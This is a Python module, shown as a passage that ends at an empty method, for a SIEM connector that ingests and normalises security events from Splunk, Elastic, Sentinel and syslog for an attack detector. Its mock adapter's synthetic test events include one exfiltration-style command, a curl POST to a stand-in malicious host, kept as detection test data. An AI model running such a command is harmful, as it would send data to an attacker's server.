"""
SIEM Connector

Provides integration with Security Information and Event Management (SIEM) systems.
Allows Agent Smith to consume security events from external SIEM platforms and
correlate them with internal boundary daemon events.

Supported SIEM Platforms:
- Splunk (via REST API)
- Elastic SIEM (via Elasticsearch API)
- Microsoft Sentinel (via Azure API)
- Generic syslog (RFC 5424)
- Custom webhook ingestion

Note: This is an aspirational module. Actual SIEM integration requires
appropriate credentials and network access, which are restricted by
the boundary daemon in most modes.
"""

import hashlib
import json
import logging
import queue
import threading
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, Iterator, List, Optional, Set
from urllib.parse import urljoin

logger = logging.getLogger(__name__)


class SIEMProvider(Enum):
    """Supported SIEM providers."""

    SPLUNK = auto()
    ELASTIC = auto()
    SENTINEL = auto()
    SYSLOG = auto()
    WEBHOOK = auto()
    MOCK = auto()  # For testing


class EventSeverity(Enum):
    """SIEM event severity levels (normalized)."""

    UNKNOWN = 0
    INFORMATIONAL = 1
    LOW = 2
    MEDIUM = 3
    HIGH = 4
    CRITICAL = 5


@dataclass
class SIEMEvent:
    """
    Normalized SIEM event.

    All events from different SIEM providers are normalized to this format
    for consistent processing by the attack detector.
    """

    event_id: str
    timestamp: datetime
    source: str  # Source system/IP
    event_type: str
    severity: EventSeverity
    category: str
    description: str
    raw_data: Dict[str, Any] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)

    # Enrichment data (added during processing)
    indicators: List[str] = field(default_factory=list)
    related_events: List[str] = field(default_factory=list)
    mitre_tactics: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "event_id": self.event_id,
            "timestamp": self.timestamp.isoformat(),
            "source": self.source,
            "event_type": self.event_type,
            "severity": self.severity.name,
            "category": self.category,
            "description": self.description,
            "raw_data": self.raw_data,
            "metadata": self.metadata,
            "indicators": self.indicators,
            "related_events": self.related_events,
            "mitre_tactics": self.mitre_tactics,
        }

    @property
    def severity_score(self) -> int:
        """Get numeric severity score."""
        return self.severity.value

    def matches_filter(self, filter_dict: Dict[str, Any]) -> bool:
        """Check if event matches filter criteria."""
        for key, value in filter_dict.items():
            if key == "severity_min":
                if self.severity.value < value:
                    return False
            elif key == "severity_max":
                if self.severity.value > value:
                    return False
            elif key == "category":
                if isinstance(value, list):
                    if self.category not in value:
                        return False
                elif self.category != value:
                    return False
            elif key == "source_pattern":
                import re
                if not re.search(value, self.source):
                    return False
            elif hasattr(self, key):
                if getattr(self, key) != value:
                    return False
        return True


@dataclass
class SIEMConfig:
    """Configuration for SIEM connection."""

    provider: SIEMProvider
    endpoint: str = ""
    api_key: str = ""
    username: str = ""
    password: str = ""
    verify_ssl: bool = True
    timeout: int = 30
    poll_interval: int = 60  # seconds
    batch_size: int = 100
    lookback_minutes: int = 15
    custom_headers: Dict[str, str] = field(default_factory=dict)
    extra_params: Dict[str, Any] = field(default_factory=dict)


class SIEMAdapter(ABC):
    """Abstract base class for SIEM adapters."""

    @abstractmethod
    def connect(self) -> bool:
        """Establish connection to SIEM."""
        pass

    @abstractmethod
    def disconnect(self) -> None:
        """Close connection to SIEM."""
        pass

    @abstractmethod
    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from SIEM."""
        pass

    @abstractmethod
    def is_connected(self) -> bool:
        """Check if connected."""
        pass


class MockSIEMAdapter(SIEMAdapter):
    """
    Mock SIEM adapter for testing and development.

    Generates synthetic security events for testing the attack detection system.
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._event_counter = 0

    def connect(self) -> bool:
        """Simulate connection."""
        self._connected = True
        logger.info("Mock SIEM adapter connected")
        return True

    def disconnect(self) -> None:
        """Simulate disconnection."""
        self._connected = False
        logger.info("Mock SIEM adapter disconnected")

    def is_connected(self) -> bool:
        return self._connected

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Generate mock events."""
        events = []
        now = datetime.now()

        # Generate a few synthetic events
        mock_events = [
            {
                "event_type": "authentication_failure",
                "severity": EventSeverity.MEDIUM,
                "category": "authentication",
                "description": "Multiple failed login attempts detected",
                "source": "10.0.0.50",
            },
            {
                "event_type": "suspicious_command",
                "severity": EventSeverity.HIGH,
                "category": "command_execution",
                "description": "Suspicious command execution: 'curl -X POST http://malicious.com'",
                "source": "agent-process",
            },
            {
                "event_type": "policy_violation",
                "severity": EventSeverity.HIGH,
                "category": "policy",
                "description": "Network access attempted in restricted mode",
                "source": "boundary_daemon",
            },
        ]

        # Only generate events sometimes to simulate real behavior
        import random
        if random.random() < 0.3:
            mock = random.choice(mock_events)
            self._event_counter += 1

            event = SIEMEvent(
                event_id=f"mock_{self._event_counter}",
                timestamp=now,
                source=mock["source"],
                event_type=mock["event_type"],
                severity=mock["severity"],
                category=mock["category"],
                description=mock["description"],
                raw_data={"mock": True, "counter": self._event_counter},
            )

            if not filters or event.matches_filter(filters):
                events.append(event)

        return events


class SplunkAdapter(SIEMAdapter):
    """
    Splunk SIEM adapter.

    Connects to Splunk via REST API to fetch security events.
    Requires network access (typically not available in RESTRICTED mode).

    Required config:
        endpoint: Splunk API URL (e.g., "https://splunk.example.com:8089")
        username: Splunk username
        password: Splunk password
        extra_params.index: Splunk index to search (default: "security")
        extra_params.search_query: Custom SPL query (optional)
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._session_key: Optional[str] = None
        self._http: Optional[Any] = None

    def connect(self) -> bool:
        """Connect to Splunk via REST API."""
        try:
            import requests
            from requests.auth import HTTPBasicAuth
        except ImportError:
            logger.error("requests library required for Splunk adapter")
            return False

        if not self.config.endpoint:
            logger.error("Splunk endpoint not configured")
            return False

        try:
            # Authenticate to Splunk
            auth_url = urljoin(self.config.endpoint, "/services/auth/login")
            response = requests.post(
                auth_url,
                data={
                    "username": self.config.username,
                    "password": self.config.password,
                },
                verify=self.config.verify_ssl,
                timeout=self.config.timeout,
            )

            if response.status_code == 200:
                # Parse session key from XML response
                import xml.etree.ElementTree as ET
                root = ET.fromstring(response.text)
                session_key = root.find(".//sessionKey")
                if session_key is not None:
                    self._session_key = session_key.text
                    self._connected = True
                    logger.info(f"Connected to Splunk at {self.config.endpoint}")
                    return True
            else:
                logger.error(f"Splunk auth failed: {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Splunk connection error: {e}")
            return False

    def disconnect(self) -> None:
        """Disconnect from Splunk."""
        self._connected = False
        self._session_key = None
        logger.info("Disconnected from Splunk")

    def is_connected(self) -> bool:
        return self._connected and self._session_key is not None

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from Splunk using Search API."""
        if not self._connected or not self._session_key:
            logger.warning("Splunk adapter not connected")
            return []

        try:
            import requests
        except ImportError:
            return []

        events = []
        index = self.config.extra_params.get("index", "security")
        custom_query = self.config.extra_params.get("search_query", "")

        # Build SPL query
        earliest = since.strftime("%Y-%m-%dT%H:%M:%S")
        if custom_query:
            search_query = f"search {custom_query} earliest={earliest}"
        else:
            search_query = (
                f'search index={index} earliest={earliest} '
                f'| eval severity=case('
                f'severity=="critical", 5, '
                f'severity=="high", 4, '
                f'severity=="medium", 3, '
                f'severity=="low", 2, '
                f'1=1, 1) '
                f'| table _time, host, source, sourcetype, severity, message'
            )

        try:
            # Create search job
            search_url = urljoin(self.config.endpoint, "/services/search/jobs")
            headers = {"Authorization": f"Splunk {self._session_key}"}

            response = requests.post(
                search_url,
                headers=headers,
                data={
                    "search": search_query,
                    "output_mode": "json",
                    "exec_mode": "oneshot",
                    "count": self.config.batch_size,
                },
                verify=self.config.verify_ssl,
                timeout=self.config.timeout,
            )

            if response.status_code == 200:
                data = response.json()
                results = data.get("results", [])

                for result in results:
                    event = self._parse_splunk_event(result)
                    if event and (not filters or event.matches_filter(filters)):
                        events.append(event)

            else:
                logger.error(f"Splunk search failed: {response.status_code}")

        except Exception as e:
            logger.error(f"Splunk fetch error: {e}")

        return events

    def _parse_splunk_event(self, result: Dict[str, Any]) -> Optional[SIEMEvent]:
        """Parse Splunk result into SIEMEvent."""
        try:
            # Parse timestamp
            time_str = result.get("_time", "")
            try:
                timestamp = datetime.fromisoformat(time_str.replace("Z", "+00:00"))
            except ValueError:
                timestamp = datetime.now()

            # Map severity
            sev_value = int(result.get("severity", 1))
            severity_map = {
                1: EventSeverity.INFORMATIONAL,
                2: EventSeverity.LOW,
                3: EventSeverity.MEDIUM,
                4: EventSeverity.HIGH,
                5: EventSeverity.CRITICAL,
            }
            severity = severity_map.get(sev_value, EventSeverity.UNKNOWN)

            # Generate event ID
            event_hash = hashlib.md5(
                f"{time_str}{result.get('host', '')}{result.get('message', '')}".encode()
            ).hexdigest()[:16]

            return SIEMEvent(
                event_id=f"splunk_{event_hash}",
                timestamp=timestamp,
                source=result.get("host", result.get("source", "unknown")),
                event_type=result.get("sourcetype", "splunk_event"),
                severity=severity,
                category=result.get("sourcetype", "security"),
                description=result.get("message", result.get("_raw", "")),
                raw_data=result,
                metadata={"provider": "splunk"},
            )
        except Exception as e:
            logger.warning(f"Failed to parse Splunk event: {e}")
            return None


class ElasticAdapter(SIEMAdapter):
    """
    Elastic SIEM adapter.

    Connects to Elasticsearch/Elastic SIEM to fetch security events.

    Required config:
        endpoint: Elasticsearch URL (e.g., "https://elasticsearch.example.com:9200")
        username: Elasticsearch username (optional with API key)
        password: Elasticsearch password (optional with API key)
        api_key: Elasticsearch API key (alternative to username/password)
        extra_params.index: Index pattern (default: "security-*")
        extra_params.query: Custom Elasticsearch query (optional)
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._client: Optional[Any] = None

    def connect(self) -> bool:
        """Connect to Elasticsearch."""
        # Try elasticsearch library first
        try:
            from elasticsearch import Elasticsearch
        except ImportError:
            # Fall back to requests-based connection
            logger.info("elasticsearch library not available, using requests")
            return self._connect_with_requests()

        if not self.config.endpoint:
            logger.error("Elasticsearch endpoint not configured")
            return False

        try:
            # Build connection kwargs
            kwargs: Dict[str, Any] = {
                "hosts": [self.config.endpoint],
                "verify_certs": self.config.verify_ssl,
                "request_timeout": self.config.timeout,
            }

            # Authentication
            if self.config.api_key:
                kwargs["api_key"] = self.config.api_key
            elif self.config.username and self.config.password:
                kwargs["basic_auth"] = (self.config.username, self.config.password)

            # Custom headers
            if self.config.custom_headers:
                kwargs["headers"] = self.config.custom_headers

            self._client = Elasticsearch(**kwargs)

            # Test connection
            if self._client.ping():
                self._connected = True
                info = self._client.info()
                logger.info(
                    f"Connected to Elasticsearch {info.get('version', {}).get('number', 'unknown')} "
                    f"at {self.config.endpoint}"
                )
                return True
            else:
                logger.error("Elasticsearch ping failed")
                return False

        except Exception as e:
            logger.error(f"Elasticsearch connection error: {e}")
            return False

    def _connect_with_requests(self) -> bool:
        """Connect using requests library (fallback)."""
        try:
            import requests
        except ImportError:
            logger.error("requests library required for Elastic adapter")
            return False

        if not self.config.endpoint:
            return False

        try:
            # Test connection
            headers = {}
            auth = None

            if self.config.api_key:
                headers["Authorization"] = f"ApiKey {self.config.api_key}"
            elif self.config.username and self.config.password:
                from requests.auth import HTTPBasicAuth
                auth = HTTPBasicAuth(self.config.username, self.config.password)

            response = requests.get(
                self.config.endpoint,
                headers=headers,
                auth=auth,
                verify=self.config.verify_ssl,
                timeout=self.config.timeout,
            )

            if response.status_code == 200:
                self._connected = True
                self._client = "requests"  # Mark as using requests
                logger.info(f"Connected to Elasticsearch at {self.config.endpoint}")
                return True
            else:
                logger.error(f"Elasticsearch connection failed: {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Elasticsearch connection error: {e}")
            return False

    def disconnect(self) -> None:
        """Disconnect from Elasticsearch."""
        if self._client and self._client != "requests":
            try:
                self._client.close()
            except Exception:
                pass
        self._client = None
        self._connected = False
        logger.info("Disconnected from Elasticsearch")

    def is_connected(self) -> bool:
        return self._connected and self._client is not None

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from Elasticsearch."""
        if not self._connected or not self._client:
            return []

        events = []
        index = self.config.extra_params.get("index", "security-*")
        custom_query = self.config.extra_params.get("query")

        # Build query
        if custom_query:
            query = custom_query
        else:
            query = {
                "bool": {
                    "must": [
                        {"range": {"@timestamp": {"gte": since.isoformat()}}},
                    ],
                    "should": [
                        {"exists": {"field": "event.severity"}},
                        {"exists": {"field": "threat.indicator"}},
                    ],
                }
            }

        try:
            if self._client == "requests":
                events = self._fetch_with_requests(index, query, filters)
            else:
                events = self._fetch_with_client(index, query, filters)
        except Exception as e:
            logger.error(f"Elasticsearch fetch error: {e}")

        return events

    def _fetch_with_client(
        self,
        index: str,
        query: Dict[str, Any],
        filters: Optional[Dict[str, Any]],
    ) -> List[SIEMEvent]:
        """Fetch using elasticsearch-py client."""
        events = []

        response = self._client.search(
            index=index,
            query=query,
            size=self.config.batch_size,
            sort=[{"@timestamp": "desc"}],
        )

        for hit in response.get("hits", {}).get("hits", []):
            event = self._parse_elastic_event(hit)
            if event and (not filters or event.matches_filter(filters)):
                events.append(event)

        return events

    def _fetch_with_requests(
        self,
        index: str,
        query: Dict[str, Any],
        filters: Optional[Dict[str, Any]],
    ) -> List[SIEMEvent]:
        """Fetch using requests library."""
        import requests

        events = []
        search_url = urljoin(self.config.endpoint, f"/{index}/_search")

        headers = {"Content-Type": "application/json"}
        auth = None

        if self.config.api_key:
            headers["Authorization"] = f"ApiKey {self.config.api_key}"
        elif self.config.username and self.config.password:
            from requests.auth import HTTPBasicAuth
            auth = HTTPBasicAuth(self.config.username, self.config.password)

        body = {
            "query": query,
            "size": self.config.batch_size,
            "sort": [{"@timestamp": "desc"}],
        }

        response = requests.post(
            search_url,
            headers=headers,
            auth=auth,
            json=body,
            verify=self.config.verify_ssl,
            timeout=self.config.timeout,
        )

        if response.status_code == 200:
            data = response.json()
            for hit in data.get("hits", {}).get("hits", []):
                event = self._parse_elastic_event(hit)
                if event and (not filters or event.matches_filter(filters)):
                    events.append(event)

        return events

    def _parse_elastic_event(self, hit: Dict[str, Any]) -> Optional[SIEMEvent]:
        """Parse Elasticsearch hit into SIEMEvent."""
        try:
            source = hit.get("_source", {})

            # Parse timestamp
            time_str = source.get("@timestamp", "")
            try:
                timestamp = datetime.fromisoformat(time_str.replace("Z", "+00:00"))
            except ValueError:
                timestamp = datetime.now()

            # Map severity (ECS format)
            sev_str = str(source.get("event", {}).get("severity", "")).lower()
            severity_map = {
                "critical": EventSeverity.CRITICAL,
                "high": EventSeverity.HIGH,
                "medium": EventSeverity.MEDIUM,
                "low": EventSeverity.LOW,
                "informational": EventSeverity.INFORMATIONAL,
            }
            severity = severity_map.get(sev_str, EventSeverity.UNKNOWN)

            # Try numeric severity if string didn't match
            if severity == EventSeverity.UNKNOWN:
                try:
                    sev_num = int(source.get("event", {}).get("severity", 0))
                    severity = EventSeverity(min(sev_num, 5))
                except (ValueError, TypeError):
                    severity = EventSeverity.UNKNOWN

            # Get description
            description = (
                source.get("message", "") or
                source.get("event", {}).get("original", "") or
                source.get("log", {}).get("original", "") or
                str(source)[:500]
            )

            # Get source
            event_source = (
                source.get("host", {}).get("name", "") or
                source.get("source", {}).get("ip", "") or
                source.get("agent", {}).get("name", "") or
                "unknown"
            )

            # Extract indicators
            indicators = []
            threat = source.get("threat", {})
            if threat.get("indicator", {}).get("ip"):
                indicators.append(f"ip:{threat['indicator']['ip']}")
            if threat.get("indicator", {}).get("domain"):
                indicators.append(f"domain:{threat['indicator']['domain']}")

            # Extract MITRE tactics
            mitre_tactics = []
            if threat.get("tactic", {}).get("name"):
                mitre_tactics.append(threat["tactic"]["name"])

            return SIEMEvent(
                event_id=f"elastic_{hit.get('_id', hashlib.md5(str(source).encode()).hexdigest()[:16])}",
                timestamp=timestamp,
                source=event_source,
                event_type=source.get("event", {}).get("action", "security_event"),
                severity=severity,
                category=source.get("event", {}).get("category", "security"),
                description=description,
                raw_data=source,
                metadata={"provider": "elastic", "index": hit.get("_index", "")},
                indicators=indicators,
                mitre_tactics=mitre_tactics,
            )
        except Exception as e:
            logger.warning(f"Failed to parse Elastic event: {e}")
            return None


class SentinelAdapter(SIEMAdapter):
    """
    Microsoft Sentinel SIEM adapter.

    Connects to Microsoft Sentinel via Azure Log Analytics API.

    Required config:
        endpoint: Sentinel workspace ID (not a URL)
        api_key: Azure Log Analytics API key (primary or secondary)
        extra_params.tenant_id: Azure tenant ID (for OAuth)
        extra_params.client_id: Azure app client ID (for OAuth)
        extra_params.client_secret: Azure app client secret (for OAuth)
        extra_params.table: Log Analytics table (default: "SecurityAlert")
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._access_token: Optional[str] = None
        self._token_expires: Optional[datetime] = None

    def connect(self) -> bool:
        """Connect to Microsoft Sentinel."""
        try:
            import requests
        except ImportError:
            logger.error("requests library required for Sentinel adapter")
            return False

        workspace_id = self.config.endpoint
        if not workspace_id:
            logger.error("Sentinel workspace ID not configured")
            return False

        # Try OAuth authentication first
        tenant_id = self.config.extra_params.get("tenant_id")
        client_id = self.config.extra_params.get("client_id")
        client_secret = self.config.extra_params.get("client_secret")

        if tenant_id and client_id and client_secret:
            return self._connect_oauth(tenant_id, client_id, client_secret)

        # Fall back to API key
        if self.config.api_key:
            return self._connect_api_key()

        logger.error("Sentinel: No authentication method configured")
        return False

    def _connect_oauth(self, tenant_id: str, client_id: str, client_secret: str) -> bool:
        """Connect using OAuth client credentials."""
        import requests

        try:
            token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
            response = requests.post(
                token_url,
                data={
                    "grant_type": "client_credentials",
                    "client_id": client_id,
                    "client_secret": client_secret,
                    "resource": "https://api.loganalytics.io",
                },
                timeout=self.config.timeout,
            )

            if response.status_code == 200:
                data = response.json()
                self._access_token = data.get("access_token")
                expires_in = int(data.get("expires_in", 3600))
                self._token_expires = datetime.now() + timedelta(seconds=expires_in - 60)
                self._connected = True
                logger.info(f"Connected to Sentinel workspace {self.config.endpoint}")
                return True
            else:
                logger.error(f"Sentinel OAuth failed: {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Sentinel OAuth error: {e}")
            return False

    def _connect_api_key(self) -> bool:
        """Connect using shared key authentication."""
        # API key auth is simpler but less secure
        self._connected = True
        logger.info(f"Connected to Sentinel workspace {self.config.endpoint} (API key)")
        return True

    def disconnect(self) -> None:
        """Disconnect from Sentinel."""
        self._connected = False
        self._access_token = None
        self._token_expires = None
        logger.info("Disconnected from Sentinel")

    def is_connected(self) -> bool:
        if not self._connected:
            return False
        # Check token expiry for OAuth
        if self._token_expires and datetime.now() >= self._token_expires:
            logger.info("Sentinel token expired, reconnecting...")
            return self.connect()
        return True

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from Sentinel via Log Analytics API."""
        if not self.is_connected():
            return []

        try:
            import requests
        except ImportError:
            return []

        events = []
        workspace_id = self.config.endpoint
        table = self.config.extra_params.get("table", "SecurityAlert")

        # Build KQL query
        time_filter = since.strftime("%Y-%m-%dT%H:%M:%SZ")
        custom_query = self.config.extra_params.get("query")

        if custom_query:
            query = f"{custom_query} | where TimeGenerated > datetime({time_filter})"
        else:
            query = f"""
                {table}
                | where TimeGenerated > datetime({time_filter})
                | project TimeGenerated, AlertName, AlertSeverity, Description,
                          CompromisedEntity, Tactics, Techniques, ProviderName
                | order by TimeGenerated desc
                | take {self.config.batch_size}
            """

        try:
            api_url = f"https://api.loganalytics.io/v1/workspaces/{workspace_id}/query"

            headers = {"Content-Type": "application/json"}
            if self._access_token:
                headers["Authorization"] = f"Bearer {self._access_token}"
            elif self.config.api_key:
                headers["x-api-key"] = self.config.api_key

            response = requests.post(
                api_url,
                headers=headers,
                json={"query": query},
                timeout=self.config.timeout,
            )

            if response.status_code == 200:
                data = response.json()
                tables = data.get("tables", [])
                if tables:
                    columns = [col["name"] for col in tables[0].get("columns", [])]
                    rows = tables[0].get("rows", [])

                    for row in rows:
                        row_dict = dict(zip(columns, row))
                        event = self._parse_sentinel_event(row_dict)
                        if event and (not filters or event.matches_filter(filters)):
                            events.append(event)
            else:
                logger.error(f"Sentinel query failed: {response.status_code}")

        except Exception as e:
            logger.error(f"Sentinel fetch error: {e}")

        return events

    def _parse_sentinel_event(self, row: Dict[str, Any]) -> Optional[SIEMEvent]:
        """Parse Sentinel row into SIEMEvent."""
        try:
            # Parse timestamp
            time_str = row.get("TimeGenerated", "")
            try:
                timestamp = datetime.fromisoformat(time_str.replace("Z", "+00:00"))
            except ValueError:
                timestamp = datetime.now()

            # Map severity
            sev_str = str(row.get("AlertSeverity", "")).lower()
            severity_map = {
                "high": EventSeverity.HIGH,
                "medium": EventSeverity.MEDIUM,
                "low": EventSeverity.LOW,
                "informational": EventSeverity.INFORMATIONAL,
            }
            severity = severity_map.get(sev_str, EventSeverity.UNKNOWN)

            # Extract MITRE tactics
            tactics = row.get("Tactics", "")
            mitre_tactics = [t.strip() for t in tactics.split(",") if t.strip()]

            # Generate event ID
            event_hash = hashlib.md5(
                f"{time_str}{row.get('AlertName', '')}".encode()
            ).hexdigest()[:16]

            return SIEMEvent(
                event_id=f"sentinel_{event_hash}",
                timestamp=timestamp,
                source=row.get("CompromisedEntity", row.get("ProviderName", "sentinel")),
                event_type=row.get("AlertName", "SecurityAlert"),
                severity=severity,
                category="security",
                description=row.get("Description", ""),
                raw_data=row,
                metadata={"provider": "sentinel", "workspace": self.config.endpoint},
                mitre_tactics=mitre_tactics,
            )
        except Exception as e:
            logger.warning(f"Failed to parse Sentinel event: {e}")
            return None


class SyslogAdapter(SIEMAdapter):
    """
    Syslog receiver adapter.

    Listens for syslog messages (RFC 5424) and converts them to SIEM events.

    Required config:
        endpoint: Listen address (e.g., "0.0.0.0:514")
        extra_params.protocol: "udp" or "tcp" (default: "udp")
        extra_params.facility_filter: List of facilities to accept (optional)
        extra_params.severity_filter: Minimum syslog severity (optional)
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._socket: Optional[Any] = None
        self._listener_thread: Optional[threading.Thread] = None
        self._running = False
        self._event_buffer: List[SIEMEvent] = []
        self._buffer_lock = threading.Lock()

    def connect(self) -> bool:
        """Start syslog listener."""
        import socket

        if not self.config.endpoint:
            logger.error("Syslog endpoint not configured")
            return False

        try:
            # Parse endpoint
            parts = self.config.endpoint.split(":")
            host = parts[0] if parts else "0.0.0.0"
            port = int(parts[1]) if len(parts) > 1 else 514

            protocol = self.config.extra_params.get("protocol", "udp").lower()

            if protocol == "udp":
                self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._socket.bind((host, port))
                self._socket.settimeout(1.0)
            else:
                self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._socket.bind((host, port))
                self._socket.listen(5)
                self._socket.settimeout(1.0)

            # Start listener thread
            self._running = True
            self._listener_thread = threading.Thread(
                target=self._listen_loop,
                args=(protocol,),
                daemon=True,
                name="SyslogListener",
            )
            self._listener_thread.start()

            self._connected = True
            logger.info(f"Syslog listener started on {host}:{port} ({protocol})")
            return True

        except Exception as e:
            logger.error(f"Syslog listener error: {e}")
            return False

    def disconnect(self) -> None:
        """Stop syslog listener."""
        self._running = False

        if self._listener_thread:
            self._listener_thread.join(timeout=2.0)
            self._listener_thread = None

        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None

        self._connected = False
        logger.info("Syslog listener stopped")

    def is_connected(self) -> bool:
        return self._connected and self._running

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Get buffered events since timestamp."""
        events = []

        with self._buffer_lock:
            for event in self._event_buffer:
                if event.timestamp >= since:
                    if not filters or event.matches_filter(filters):
                        events.append(event)

            # Clear old events
            cutoff = datetime.now() - timedelta(minutes=self.config.lookback_minutes)
            self._event_buffer = [e for e in self._event_buffer if e.timestamp > cutoff]

        return events

    def _listen_loop(self, protocol: str) -> None:
        """Main listener loop."""
        import socket

        while self._running:
            try:
                if protocol == "udp":
                    try:
                        data, addr = self._socket.recvfrom(65535)
                        self._process_message(data.decode("utf-8", errors="replace"), addr[0])
                    except socket.timeout:
                        continue

                else:  # TCP
                    try:
                        conn, addr = self._socket.accept()
                        conn.settimeout(5.0)
                        data = conn.recv(65535)
                        conn.close()
                        self._process_message(data.decode("utf-8", errors="replace"), addr[0])
                    except socket.timeout:
                        continue

            except Exception as e:
                if self._running:
                    logger.warning(f"Syslog receive error: {e}")

    def _process_message(self, message: str, source_ip: str) -> None:
        """Process a syslog message."""
        event = self._parse_syslog(message, source_ip)
        if event:
            # Apply facility/severity filters
            facility_filter = self.config.extra_params.get("facility_filter")
            if facility_filter and event.category not in facility_filter:
                return

            min_severity = self.config.extra_params.get("severity_filter", 0)
            if event.severity_score < min_severity:
                return

            with self._buffer_lock:
                self._event_buffer.append(event)

                # Limit buffer size
                if len(self._event_buffer) > 10000:
                    self._event_buffer = self._event_buffer[-5000:]

    def _parse_syslog(self, message: str, source_ip: str) -> Optional[SIEMEvent]:
        """Parse syslog message (RFC 5424 or BSD format)."""
        try:
            import re

            # RFC 5424 format: <PRI>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID MSG
            rfc5424_pattern = r"<(\d+)>(\d+)?\s*(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s*(.*)"
            match = re.match(rfc5424_pattern, message)

            if match:
                pri = int(match.group(1))
                timestamp_str = match.group(3)
                hostname = match.group(4)
                appname = match.group(5)
                msg = match.group(8)

                # Parse PRI into facility and severity
                syslog_severity = pri & 0x07
                facility = (pri >> 3) & 0x1F

                # Map syslog severity to our severity
                severity_map = {
                    0: EventSeverity.CRITICAL,  # Emergency
                    1: EventSeverity.CRITICAL,  # Alert
                    2: EventSeverity.HIGH,      # Critical
                    3: EventSeverity.HIGH,      # Error
                    4: EventSeverity.MEDIUM,    # Warning
                    5: EventSeverity.LOW,       # Notice
                    6: EventSeverity.INFORMATIONAL,  # Informational
                    7: EventSeverity.INFORMATIONAL,  # Debug
                }
                severity = severity_map.get(syslog_severity, EventSeverity.UNKNOWN)

                # Facility names
                facilities = [
                    "kern", "user", "mail", "daemon", "auth", "syslog", "lpr",
                    "news", "uucp", "cron", "authpriv", "ftp", "ntp", "audit",
                    "alert", "clock", "local0", "local1", "local2", "local3",
                    "local4", "local5", "local6", "local7",
                ]
                facility_name = facilities[facility] if facility < len(facilities) else f"facility{facility}"

                # Parse timestamp
                try:
                    timestamp = datetime.fromisoformat(timestamp_str.replace("Z", "+00:00"))
                except ValueError:
                    timestamp = datetime.now()

                event_hash = hashlib.md5(message.encode()).hexdigest()[:16]

                return SIEMEvent(
                    event_id=f"syslog_{event_hash}",
                    timestamp=timestamp,
                    source=hostname if hostname != "-" else source_ip,
                    event_type=appname if appname != "-" else "syslog",
                    severity=severity,
                    category=facility_name,
                    description=msg,
                    raw_data={"raw": message, "pri": pri, "facility": facility_name},
                    metadata={"provider": "syslog", "source_ip": source_ip},
                )

            else:
                # Try BSD syslog format: <PRI>TIMESTAMP HOSTNAME MSG
                bsd_pattern = r"<(\d+)>(.+)"
                match = re.match(bsd_pattern, message)

                if match:
                    pri = int(match.group(1))
                    rest = match.group(2)
                    syslog_severity = pri & 0x07

                    severity_map = {
                        0: EventSeverity.CRITICAL,
                        1: EventSeverity.CRITICAL,
                        2: EventSeverity.HIGH,
                        3: EventSeverity.HIGH,
                        4: EventSeverity.MEDIUM,
                        5: EventSeverity.LOW,
                        6: EventSeverity.INFORMATIONAL,
                        7: EventSeverity.INFORMATIONAL,
                    }
                    severity = severity_map.get(syslog_severity, EventSeverity.UNKNOWN)

                    event_hash = hashlib.md5(message.encode()).hexdigest()[:16]

                    return SIEMEvent(
                        event_id=f"syslog_{event_hash}",
                        timestamp=datetime.now(),
                        source=source_ip,
                        event_type="syslog",
                        severity=severity,
                        category="syslog",
                        description=rest,
                        raw_data={"raw": message, "pri": pri},
                        metadata={"provider": "syslog", "source_ip": source_ip},
                    )

            return None

        except Exception as e:
            logger.warning(f"Failed to parse syslog message: {e}")
            return None


class SIEMConnector:
    """
    Main SIEM connector managing multiple SIEM sources.

    Aggregates events from multiple SIEM providers and provides
    a unified event stream for the attack detector.
    """

    def __init__(
        self,
        on_event: Optional[Callable[[SIEMEvent], None]] = None,
    ):
        """
        Initialize SIEM connector.

        Args:
            on_event: Callback for new events
        """
        self.on_event = on_event
        self._adapters: Dict[str, SIEMAdapter] = {}
        self._running = False
        self._poll_thread: Optional[threading.Thread] = None
        self._event_queue: queue.Queue = queue.Queue()
        self._seen_events: Set[str] = set()
        self._lock = threading.Lock()

        # Statistics
        self._stats = {
            "events_received": 0,
            "events_deduplicated": 0,
            "poll_cycles": 0,
            "errors": 0,
        }

    def add_source(
        self,
        name: str,
        config: SIEMConfig,
    ) -> bool:
        """
        Add a SIEM source.

        Args:
            name: Unique name for this source
            config: SIEM configuration

        Returns:
            True if source added successfully
        """
        adapter = self._create_adapter(config)
        if adapter:
            with self._lock:
                self._adapters[name] = adapter
            logger.info(f"Added SIEM source: {name} ({config.provider.name})")
            return True
        return False

    def remove_source(self, name: str) -> bool:
        """Remove a SIEM source."""
